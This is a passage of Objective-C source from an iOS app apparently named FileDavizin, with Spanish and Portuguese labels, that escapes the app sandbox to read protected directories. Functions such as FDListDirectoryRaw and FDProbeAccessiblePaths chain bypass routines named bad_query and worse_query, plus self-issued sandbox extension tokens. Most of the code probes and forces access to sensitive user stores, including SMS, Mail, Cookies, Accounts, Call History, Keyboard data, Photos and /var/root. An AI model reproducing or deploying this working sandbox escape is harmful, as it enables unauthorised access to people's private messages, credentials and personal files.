                _diagAppend("init-bq-ag: %s OK | ", kEscapePaths[i]);
                FDLog([NSString stringWithFormat:@"init BQ-AG OK: %s g[%d]", kEscapePaths[i], g]);
                break;
            }
        }
    }

    // Verify what's actually accessible
    int accessible = 0;
    for (int i = 0; i < n; i++) {
        int fd = open(kEscapePaths[i], O_RDONLY | O_DIRECTORY | O_CLOEXEC);
        if (fd >= 0) {
            close(fd);
            accessible++;
            FDLog([NSString stringWithFormat:@"init VERIFY OK: %s", kEscapePaths[i]]);
        } else {
            FDLog([NSString stringWithFormat:@"init VERIFY FAIL: %s errno=%d", kEscapePaths[i], errno]);
        }
    }

    _diagAppend("init: granted=%d accessible=%d/%d", granted, accessible, n);
    FDLog([NSString stringWithFormat:@"Engine init DONE: granted=%d accessible=%d/%d",
           granted, accessible, n]);
    return accessible;
}

const char *FDLastDiagnostic(void) {
    return sDiag;
}

NSString *FDRunFullDiagnostic(void) {
    NSMutableString *report = [NSMutableString string];
    NSFileManager *fm = [NSFileManager defaultManager];

    [report appendString:@"=== FileDavizin Diagnostic ===\n\n"];

    // 1. MCM API status
    MCMAPI *api = FDGetAPI();
    [report appendFormat:@"[API] dylib handle: %s\n", api->handle ? "OK" : "NULL"];
    [report appendFormat:@"[API] queryCreate: %s\n", api->queryCreate ? "OK" : "NULL"];
    [report appendFormat:@"[API] querySetClass: %s\n", api->querySetClass ? "OK" : "NULL"];
    [report appendFormat:@"[API] querySetIdentifiers: %s\n", api->querySetIdentifiers ? "OK" : "NULL"];
    [report appendFormat:@"[API] querySetGroupIdentifiers: %s\n", api->querySetGroupIdentifiers ? "OK" : "NULL"];
    [report appendFormat:@"[API] querySetFlags: %s\n", api->querySetFlags ? "OK" : "NULL"];
    [report appendFormat:@"[API] querySetPart: %s\n", api->querySetPart ? "OK" : "NULL"];
    [report appendFormat:@"[API] querySetPartDomain: %s\n", api->querySetPartDomain ? "OK" : "NULL"];
    [report appendFormat:@"[API] queryGetSingle: %s\n", api->queryGetSingle ? "OK" : "NULL"];
    [report appendFormat:@"[API] queryIterate: %s\n", api->queryIterate ? "OK" : "NULL"];
    [report appendFormat:@"[API] objectGetPath: %s\n", api->objectGetPath ? "OK" : "NULL"];
    [report appendFormat:@"[API] objectGetIdentifier: %s\n", api->objectGetIdentifier ? "OK" : "NULL"];
    [report appendFormat:@"[API] objectCopy: %s\n", api->objectCopy ? "OK" : "NULL"];
    [report appendFormat:@"[API] objectCopyToken: %s\n", api->objectCopyToken ? "OK" : "NULL"];
    [report appendFormat:@"[API] objectActivate: %s\n", api->objectActivate ? "OK" : "NULL"];

    // 2. sandbox_extension functions
    void *consumeExt = dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
    void *releaseExt = dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    [report appendFormat:@"\n[SBX] sandbox_extension_consume: %s\n", consumeExt ? "OK" : "NULL"];
    [report appendFormat:@"[SBX] sandbox_extension_release: %s\n", releaseExt ? "OK" : "NULL"];
    [report appendFormat:@"[SBX] sandbox_access_is_active: %d\n", sandbox_access_is_active()];

    // 3. App group containers
    [report appendString:@"\n[GROUPS]\n"];
    const char **rtGroups; int rtGroupCount;
    _getRuntimeAppGroups(&rtGroups, &rtGroupCount);
    [report appendFormat:@"count: %d\n", rtGroupCount];
    for (int g = 0; g < rtGroupCount; g++) {
        NSString *gid = [NSString stringWithUTF8String:rtGroups[g]];
        NSURL *url = [fm containerURLForSecurityApplicationGroupIdentifier:gid];
        [report appendFormat:@"  [%d] %s -> %@\n", g, rtGroups[g], url ? url.path : @"NULL"];
        if (url) {
            NSString *libPath = [url.path stringByAppendingPathComponent:@"Library"];
            int libFd = open(libPath.fileSystemRepresentation, O_RDONLY | O_DIRECTORY | O_CLOEXEC);
            [report appendFormat:@"       Library fd: %d (errno=%d)\n", libFd, libFd < 0 ? errno : 0];
            if (libFd >= 0) close(libFd);
        }
    }

    // 4. Key paths access test
    [report appendString:@"\n[PATHS]\n"];
    static const char *kTestPaths[] = {
        "/private/var/mobile/Containers/Data/Application",
        "/private/var/mobile/Containers/Data/System",
        "/private/var/mobile/Containers/Shared/AppGroup",
        "/private/var/mobile/Containers/Shared/SystemGroup",
        "/private/var/mobile/Library/Caches",
        "/private/var/mobile/Containers/Data/InternalDaemon",
        "/private/var/db/lsd",
        "/var/mobile/Containers/Data/Application",
    };
    for (int i = 0; i < (int)(sizeof(kTestPaths)/sizeof(kTestPaths[0])); i++) {
        int fd = open(kTestPaths[i], O_RDONLY | O_DIRECTORY | O_CLOEXEC);
        DIR *dir = opendir(kTestPaths[i]);
        int entries = 0;
        if (dir) {
            struct dirent *e;
            while ((e = readdir(dir)) != NULL) {
                if (e->d_name[0] != '.') entries++;
                if (entries >= 5) break;
            }
            closedir(dir);
        }
        [report appendFormat:@"  %s -> fd=%d dir=%s entries>=%d\n",
            kTestPaths[i], fd, dir ? "OK" : "NULL", entries];
        if (fd >= 0) close(fd);
    }

    // 5. MCM class-2 enumeration test
    [report appendString:@"\n[MCM-ENUM]\n"];
    NSArray *enumResult = _enumerateIdentifiers(2, 10);
    [report appendFormat:@"class-2 identifiers: %lu\n", (unsigned long)enumResult.count];
    for (NSString *ident in enumResult) {
        [report appendFormat:@"  %@\n", ident];
    }

    // 6. MCM class-2 specific resolve test
    [report appendString:@"\n[MCM-RESOLVE]\n"];
    NSArray *testBIDs = @[@"com.apple.mobilesafari", @"com.apple.Preferences",
                          @"com.apple.MobileSMS", @"com.apple.mobilenotes"];
    for (NSString *bid in testBIDs) {
        NSString *path = _mcmResolvePath(bid);
        [report appendFormat:@"  %@ -> %@\n", bid, path ?: @"NULL"];
    }

    // 6.5. System container discovery (lsd, swcd, etc.)
    [report appendString:@"\n[SYS-CONTAINERS]\n"];
    {
        static const struct { uint64_t cls; const char *ident; bool grp; } kSysDiag[] = {
            { 10, "com.apple.lsd",       false },
            { 10, "com.apple.swcd",      false },
            { 12, "com.apple.geod",      false },
            { 12, "com.apple.eligibilityd", false },
            { 13, "systemgroup.com.apple.mobilegestaltcache", true },
            { 15, "com.apple.appmanagedfeaturesd", false },
        };
        for (int si = 0; si < 6; si++) {
            NSString *ident = [NSString stringWithUTF8String:kSysDiag[si].ident];
            NSString *path = _mcmQuerySystemContainerPath(
                kSysDiag[si].cls, ident, kSysDiag[si].grp);
            int accessible = -1;
            int entries = 0;
            if (path) {
                int fd = open(path.fileSystemRepresentation, O_RDONLY | O_DIRECTORY | O_CLOEXEC);
                accessible = (fd >= 0) ? 1 : 0;
                if (fd >= 0) close(fd);
                NSString *cachePath = [[path stringByAppendingPathComponent:@"Library"]
                                       stringByAppendingPathComponent:@"Caches"];
                DIR *dir = opendir(cachePath.fileSystemRepresentation);
                if (dir) {
                    struct dirent *e;
                    while ((e = readdir(dir)) != NULL) {
                        if (e->d_name[0] != '.') entries++;
                    }
                    closedir(dir);
                }
            }
            [report appendFormat:@"  C%llu %@ -> %@ acc=%d cache_entries=%d\n",
                kSysDiag[si].cls, ident, path ?: @"NULL", accessible, entries];
        }
    }

    // 7. csstore discovery
    [report appendString:@"\n[CSSTORE]\n"];
    NSSet *csCandidates = _findAndParseCSStores();
    [report appendFormat:@"total candidates: %lu\n", (unsigned long)csCandidates.count];
    if (csCandidates.count > 0) {
        int shown = 0;
        for (NSString *bid in csCandidates) {
            if (shown >= 10) break;
            [report appendFormat:@"  sample[%d]: %@\n", shown, bid];
            shown++;
        }
        // Test resolve on first 20 candidates
        int resolved = 0;
        int tested = 0;
        for (NSString *bid in csCandidates) {
            if (tested >= 20) break;
            tested++;
            NSString *path = _mcmResolvePath(bid);
            if (path) {
                resolved++;
                if (resolved <= 3) {
                    [report appendFormat:@"  resolved: %@ -> %@\n", bid, path];
                }
            }
        }
        [report appendFormat:@"  resolve test: %d/%d resolved\n", resolved, tested];
    }

    // 8. LaunchServices
    [report appendString:@"\n[LAUNCHSERVICES]\n"];
    NSArray *lsApps = _launchServicesEnumerate();
    [report appendFormat:@"LS apps: %lu\n", (unsigned long)lsApps.count];

    // 9. Directory scan test
    [report appendString:@"\n[DIR-SCAN]\n"];
    static const char *kScanDirs[] = {
        "/private/var/mobile/Containers/Data/Application",
        "/var/mobile/Containers/Data/Application",
    };
    for (int d = 0; d < 2; d++) {
        DIR *dir = opendir(kScanDirs[d]);
        [report appendFormat:@"  opendir(%s): %s\n", kScanDirs[d], dir ? "OK" : "FAIL"];
        if (dir) {
            int count = 0;
            int withPlist = 0;
            struct dirent *entry;
            while ((entry = readdir(dir)) != NULL && count < 500) {
                if (entry->d_name[0] == '.') continue;
                if (strlen(entry->d_name) < 32) continue;
                count++;
                char metaPath[1200];
                snprintf(metaPath, sizeof(metaPath),
                         "%s/%s/.com.apple.mobile_container_manager.metadata.plist",
                         kScanDirs[d], entry->d_name);
                if (access(metaPath, R_OK) == 0) withPlist++;
            }
            closedir(dir);
            [report appendFormat:@"  UUID dirs: %d  with plist: %d\n", count, withPlist];
        } else {
            [report appendFormat:@"  errno: %d (%s)\n", errno, strerror(errno)];
        }
    }

    // 10. Engine last diagnostic
    [report appendFormat:@"\n[DIAG] %s\n", sDiag];
    [report appendString:@"\n=== END ===\n"];

    NSLog(@"[FD-DIAG]\n%@", report);
    return report;
}

#pragma mark - Raw Directory Listing

NSArray<NSDictionary *> *FDListDirectoryRaw(const char *dirPath) {
    if (!dirPath) return @[];

    // NOTE: No outer mutex here — each grant strategy locks its own mutex.
    // Holding an outer mutex + strategy's inner mutex causes leaked lock counts
    // when exceptions skip the inner unlock, leading to deadlock → crash.

    @try {
        // Try opening directly first
        DIR *dp = opendir(dirPath);

        if (!dp) {
            // Grant access via worse_query symlink (safest, fastest)
            @try {
                _worseQuerySymlink(dirPath);
            } @catch (NSException *e) {
                NSLog(@"[FD] ListDir WQ-SYM exception: %@", e);
            }
            dp = opendir(dirPath);
        }

        if (!dp && (strstr(dirPath, "/containers/Bundle/") || strstr(dirPath, "/Bundle/Application"))) {
            @try {
                _worseQuerySymlinkWithPart(dirPath, 1);
            } @catch (NSException *e) {
                NSLog(@"[FD] ListDir WQ-SYM-Bundle exception: %@", e);
            }
            dp = opendir(dirPath);
        }

        if (!dp) {
            // Try parent directory symlink
            char parent[1024];
            strlcpy(parent, dirPath, sizeof(parent));
            char *slash = strrchr(parent, '/');
            if (slash && slash != parent) {
                *slash = '\0';
                @try {
                    _worseQuerySymlink(parent);
                } @catch (NSException *e) {
                    NSLog(@"[FD] ListDir parent WQ-SYM exception: %@", e);
                }
                if (strstr(parent, "/containers/Bundle/") || strstr(parent, "/Bundle/Application")) {
                    @try {
                        _worseQuerySymlinkWithPart(parent, 1);
                    } @catch (NSException *e) {
                        NSLog(@"[FD] ListDir parent WQ-SYM-Bundle exception: %@", e);
                    }
                }
            }
            dp = opendir(dirPath);
        }

        if (!dp) {
            // Try worse_query grant (partDomain)
            @try {
                _worseQueryGrant(dirPath, "fd-list");
            } @catch (NSException *e) {
                NSLog(@"[FD] ListDir WQ-PD exception: %@", e);
            }
            dp = opendir(dirPath);
        }

        if (!dp) {
            // Try bad_query
            @try {
                bad_query((char *)dirPath, true, NULL, false);
            } @catch (NSException *e) {
                NSLog(@"[FD] ListDir BQ exception: %@", e);
            }
            dp = opendir(dirPath);
        }

        if (!dp) {
            // Try bad_query with each app group
            const char **rtGroups; int rtGroupCount;
            _getRuntimeAppGroups(&rtGroups, &rtGroupCount);
            for (int g = 0; g < rtGroupCount && !dp; g++) {
                @try {
                    bad_query((char *)dirPath, true, (char *)rtGroups[g], false);
                } @catch (NSException *e) {
                    NSLog(@"[FD] ListDir BQ-AG exception: %@", e);
                }
                dp = opendir(dirPath);
            }
        }

        if (!dp) {
            // sandbox_extension_issue_file as last resort
            @try {
                typedef char *(*SBXIssueFunc)(const char *, const char *, int);
                SBXIssueFunc issueFile = (SBXIssueFunc)dlsym(RTLD_DEFAULT,
                    "sandbox_extension_issue_file");
                typedef int64_t (*SBXConsumeFunc)(const char *);
                SBXConsumeFunc consumeExt = (SBXConsumeFunc)dlsym(RTLD_DEFAULT,
                    "sandbox_extension_consume");
                if (issueFile && consumeExt) {
                    const char *exts[] = {
                        "com.apple.app-sandbox.read",
                        "com.apple.app-sandbox.read-write",
                        "com.apple.sandbox.container",
                    };
                    for (int e = 0; e < 3 && !dp; e++) {
                        char *token = issueFile(exts[e], dirPath, 0);
                        if (token) {
                            consumeExt(token);
                            free(token);
                        }
                        dp = opendir(dirPath);
                    }
                }
            } @catch (NSException *e) {
                NSLog(@"[FD] ListDir SBX exception: %@", e);
            }
        }

        if (!dp) {
            NSLog(@"[FD] FDListDirectoryRaw: opendir(%s) FAILED: %s", dirPath, strerror(errno));
            return @[];
        }

        NSMutableArray *results = [NSMutableArray array];
        struct dirent *entry;
        while ((entry = readdir(dp)) != NULL) {
            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;

            NSString *name = [NSString stringWithUTF8String:entry->d_name];
            if (!name) continue;

            char fullPath[2048];
            snprintf(fullPath, sizeof(fullPath), "%s/%s", dirPath, entry->d_name);

            struct stat st;
            BOOL didStat = (lstat(fullPath, &st) == 0);

            BOOL isDir = NO;
            uint64_t size = 0;
            double modTime = 0;
            NSString *perms = @"?";
            BOOL isHidden = (entry->d_name[0] == '.');
            BOOL isSymlink = NO;

            if (didStat) {
                isDir = S_ISDIR(st.st_mode);
                isSymlink = S_ISLNK(st.st_mode);
                size = (uint64_t)st.st_size;
                modTime = (double)st.st_mtimespec.tv_sec + (double)st.st_mtimespec.tv_nsec / 1e9;

                char p[11];
                p[0] = S_ISDIR(st.st_mode) ? 'd' : S_ISLNK(st.st_mode) ? 'l' : '-';
                p[1] = (st.st_mode & S_IRUSR) ? 'r' : '-';
                p[2] = (st.st_mode & S_IWUSR) ? 'w' : '-';
                p[3] = (st.st_mode & S_IXUSR) ? 'x' : '-';
                p[4] = (st.st_mode & S_IRGRP) ? 'r' : '-';
                p[5] = (st.st_mode & S_IWGRP) ? 'w' : '-';
                p[6] = (st.st_mode & S_IXGRP) ? 'x' : '-';
                p[7] = (st.st_mode & S_IROTH) ? 'r' : '-';
                p[8] = (st.st_mode & S_IWOTH) ? 'w' : '-';
                p[9] = (st.st_mode & S_IXOTH) ? 'x' : '-';
                p[10] = '\0';
                perms = [NSString stringWithUTF8String:p];

                if (isSymlink) {
                    struct stat tst;
                    if (stat(fullPath, &tst) == 0) {
                        isDir = S_ISDIR(tst.st_mode);
                    }
                }
            } else {
                if (entry->d_type == DT_DIR) isDir = YES;
            }

            NSString *fullPathStr = [NSString stringWithUTF8String:fullPath];
            [results addObject:@{
                @"name": name,
                @"path": fullPathStr ?: name,
                @"isDir": @(isDir),
                @"size": @(size),
                @"modified": @(modTime),
                @"perms": perms,
                @"isHidden": @(isHidden),
                @"isSymlink": @(isSymlink),
            }];
        }
        closedir(dp);

        NSLog(@"[FD] FDListDirectoryRaw(%s): %lu entries", dirPath, (unsigned long)results.count);
        return results;

    } @catch (NSException *e) {
        NSLog(@"[FD] FDListDirectoryRaw EXCEPTION for %s: %@", dirPath, e);
        return @[];
    }
}

NSArray<NSDictionary *> *FDProbeAccessiblePaths(void) {
    _ensureEngineMutex();
    pthread_mutex_lock(&sEngineMutex);
    @try {

    static const struct { const char *path; const char *label; const char *category; } kPaths[] = {
        // Raiz
        { "/",                                              "/ (raiz)",         "raiz" },
        // Sistema
        { "/System",                                        "/System",          "sistema" },
        { "/System/Library",                                "System Library",   "sistema" },
        { "/System/Library/Frameworks",                     "Frameworks",       "sistema" },
        { "/System/Library/PrivateFrameworks",              "Private Frameworks","sistema" },
        { "/System/Library/CoreServices",                   "CoreServices",     "sistema" },
        { "/System/Library/PreferenceBundles",              "PreferenceBundles","sistema" },
        { "/System/Library/LaunchDaemons",                  "LaunchDaemons",    "sistema" },
        { "/System/Library/Caches",                         "System Caches",    "sistema" },
        { "/System/Library/Security",                       "Security",         "sistema" },
        { "/System/Library/Fonts",                          "Fonts",            "sistema" },
        { "/Applications",                                  "System Apps",      "sistema" },
        // Binarios
        { "/usr",                                           "/usr",             "binarios" },
        { "/usr/lib",                                       "/usr/lib",         "binarios" },
        { "/usr/bin",                                       "/usr/bin",         "binarios" },
        { "/usr/sbin",                                      "/usr/sbin",        "binarios" },
        { "/usr/libexec",                                   "/usr/libexec",     "binarios" },
        { "/bin",                                           "/bin",             "binarios" },
        { "/sbin",                                          "/sbin",            "binarios" },
        { "/Library",                                       "/Library",         "binarios" },
        // Usuario
        { "/private/var/mobile",                            "/var/mobile",      "usuario" },
        { "/private/var/mobile/Library",                    "Mobile Library",   "usuario" },
        { "/private/var/mobile/Library/Preferences",        "Preferences",      "usuario" },
        { "/private/var/mobile/Library/Safari",             "Safari",           "usuario" },
        { "/private/var/mobile/Library/Mail",               "Mail",             "usuario" },
        { "/private/var/mobile/Library/SMS",                "SMS",              "usuario" },
        { "/private/var/mobile/Library/Notes",              "Notes",            "usuario" },
        { "/private/var/mobile/Library/Cookies",            "Cookies",          "usuario" },
        { "/private/var/mobile/Library/Accounts",           "Accounts",         "usuario" },
        { "/private/var/mobile/Library/Calendar",           "Calendar",         "usuario" },
        { "/private/var/mobile/Library/AddressBook",        "AddressBook",      "usuario" },
        { "/private/var/mobile/Library/CallHistoryDB",      "Call History",     "usuario" },
        { "/private/var/mobile/Library/Keyboard",           "Keyboard",         "usuario" },
        { "/private/var/mobile/Library/SpringBoard",        "SpringBoard",      "usuario" },
        { "/private/var/mobile/Library/Logs",               "Mobile Logs",      "usuario" },
        { "/private/var/mobile/Library/Caches",             "Mobile Caches",    "usuario" },
        { "/private/var/mobile/Library/ConfigurationProfiles","Config Profiles", "usuario" },
        { "/private/var/mobile/Documents",                  "Documents",        "usuario" },
        // Media
        { "/private/var/mobile/Media",                      "Media",            "media" },
        { "/private/var/mobile/Media/DCIM",                 "DCIM (Photos)",    "media" },
        { "/private/var/mobile/Media/PhotoData",            "PhotoData",        "media" },
        { "/private/var/mobile/Media/Downloads",            "Downloads",        "media" },
        { "/private/var/mobile/Media/iTunes_Control",       "iTunes Control",   "media" },
        { "/private/var/mobile/Media/Books",                "Books",            "media" },
        { "/private/var/mobile/Media/Recordings",           "Recordings",       "media" },
        // Contenedores
        { "/private/var/mobile/Containers",                 "Containers",       "contenedores" },
        { "/private/var/mobile/Containers/Data/Application","App Data",         "contenedores" },
        { "/private/var/mobile/Containers/Data/System",     "System Data",      "contenedores" },
        { "/private/var/mobile/Containers/Data/InternalDaemon","InternalDaemon","contenedores" },
        { "/private/var/mobile/Containers/Data/PluginKitPlugin","Plugins",      "contenedores" },
        { "/private/var/mobile/Containers/Shared/AppGroup", "App Groups",       "contenedores" },
        { "/private/var/mobile/Containers/Shared/SystemGroup","System Groups",  "contenedores" },
        { "/private/var/containers",                        "All Containers",   "contenedores" },
        { "/private/var/containers/Bundle/Application",     "App Bundles",      "contenedores" },
        { "/private/var/containers/Data/System",            "System Containers","contenedores" },
        // Var Sistema
        { "/private/var",                                   "/var",             "var" },
        { "/private/var/root",                              "/var/root",        "var" },
        { "/private/var/root/Library",                      "Root Library",     "var" },
        { "/private/var/db",                                "/var/db",          "var" },
        { "/private/var/db/lsd",                            "lsd database",     "var" },
        { "/private/var/logs",                              "System Logs",      "var" },
        { "/private/var/preferences",                       "System Prefs",     "var" },
        { "/private/var/MobileDevice",                      "MobileDevice",     "var" },
        { "/private/var/MobileDevice/ProvisioningProfiles", "Provisioning",     "var" },
        { "/private/var/wireless",                          "Wireless",         "var" },
        { "/private/var/installd",                          "installd",         "var" },
        { "/private/var/MobileSoftwareUpdate",              "Software Update",  "var" },
        { "/private/var/tmp",                               "var tmp",          "var" },
        { "/private/etc",                                   "/etc",             "var" },
        { "/tmp",                                           "/tmp",             "var" },
    };
    int n = sizeof(kPaths) / sizeof(kPaths[0]);
    NSMutableArray *results = [NSMutableArray arrayWithCapacity:n];

    // Also add app's own container paths
    NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    NSString *appContainer = docs ? [docs stringByDeletingLastPathComponent] : nil;

    if (appContainer) {
        DIR *dp = opendir(appContainer.fileSystemRepresentation);
        int count = 0;
        if (dp) {
            struct dirent *e;
            while ((e = readdir(dp))) {
                if (e->d_name[0] == '.' && (e->d_name[1] == '\0' ||
                    (e->d_name[1] == '.' && e->d_name[2] == '\0'))) continue;
                count++;
            }
            closedir(dp);
        }
        [results addObject:@{
            @"path": appContainer,
            @"label": @"App Container (propio)",
            @"accessible": @(count > 0),
            @"entryCount": @(count),
        }];
    }

    // Add app group container
    NSFileManager *fm = [NSFileManager defaultManager];
    const char **rtGroups; int rtGroupCount;
    _getRuntimeAppGroups(&rtGroups, &rtGroupCount);
    for (int g = 0; g < rtGroupCount; g++) {
        NSString *gid = [NSString stringWithUTF8String:rtGroups[g]];
        NSURL *gURL = [fm containerURLForSecurityApplicationGroupIdentifier:gid];
        if (!gURL) continue;
        DIR *dp = opendir(gURL.path.fileSystemRepresentation);
        int count = 0;
        if (dp) {
            struct dirent *e;
            while ((e = readdir(dp))) {
                if (e->d_name[0] == '.' && (e->d_name[1] == '\0' ||
                    (e->d_name[1] == '.' && e->d_name[2] == '\0'))) continue;
                count++;
            }
            closedir(dp);
        }
        [results addObject:@{
            @"path": gURL.path,
            @"label": [NSString stringWithFormat:@"App Group %d", g],
            @"accessible": @(count > 0),
            @"entryCount": @(count),
        }];
    }

    for (int i = 0; i < n; i++) {
        // Try opendir first without granting
        DIR *dp = opendir(kPaths[i].path);
        if (!dp) {
            // Try granting access
            FDGrantAccess(kPaths[i].path);
            dp = opendir(kPaths[i].path);
        }
        int count = 0;
        if (dp) {
            struct dirent *e;
            while ((e = readdir(dp))) {
                if (e->d_name[0] == '.' && (e->d_name[1] == '\0' ||
                    (e->d_name[1] == '.' && e->d_name[2] == '\0'))) continue;
                count++;
            }
            closedir(dp);
        }
        [results addObject:@{
            @"path": [NSString stringWithUTF8String:kPaths[i].path],
            @"label": [NSString stringWithUTF8String:kPaths[i].label],
            @"category": [NSString stringWithUTF8String:kPaths[i].category],
            @"accessible": @(dp != NULL),
            @"entryCount": @(count),
        }];
    }

    int totalAccessible = 0;
    for (NSDictionary *d in results) {
        if ([d[@"accessible"] boolValue]) totalAccessible++;
    }
    NSLog(@"[FD] FDProbeAccessiblePaths: %d/%lu accessible", totalAccessible, (unsigned long)results.count);
    return results;

    } @finally {
        pthread_mutex_unlock(&sEngineMutex);
    }
}
